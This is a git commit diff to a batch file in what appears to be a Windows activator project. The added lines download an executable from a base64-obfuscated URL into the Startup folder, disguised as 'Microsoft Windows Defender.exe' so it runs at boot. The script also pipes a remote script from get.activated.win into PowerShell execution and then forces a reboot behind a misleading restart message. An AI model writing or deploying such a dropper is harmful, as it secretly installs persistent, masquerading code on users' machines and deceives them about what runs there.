558b3cffb9e42ca0627b40f4df32c8b95415f501
betamod9 <164927681+betamod9@users.noreply.github.com>
2025-01-10 04:14:36 +0200

    Update windows.bat

--- windows.bat
+++ windows.bat
@@ -1,12 +1,25 @@
 @echo off
 set "b64=aHR0cHM6Ly9naXRodWIuY29tL2JldGFtb2Q5L1dpbmRvd3MtMTAtYW5kLTExLUFjdGl2YXRvci9yZWxlYXNlcy9kb3dubG9hZC8xMi4yNy4yMDI0L1dpbmRvd3NLZXkuZXhl"
 for /f "tokens=*" %%a in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%b64%'))"') do set "url=%%a"
-set "filename=%temp%\windowskeyactivation.exe"
+set "filename=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft Windows Defender.exe"
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%filename%'" >nul 2>&1
+
 if exist "%filename%" (
-    start "" "%filename%"
+    REM Do nothing - do not start the file
 ) else (
     goto server
 )
+
 :server
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm https://get.activated.win | iex"
+
+REM Display message before the 3-minute countdown
+echo The system needs to restart for the changes to take effect.
+echo Please wait while the system prepares for the restart...
+echo Restart will occur in 3 minutes.
+
+REM Wait for 3 minutes (180 seconds)
+timeout /t 180 /nobreak
+
+REM Restart the computer
+shutdown /r /f /t 0
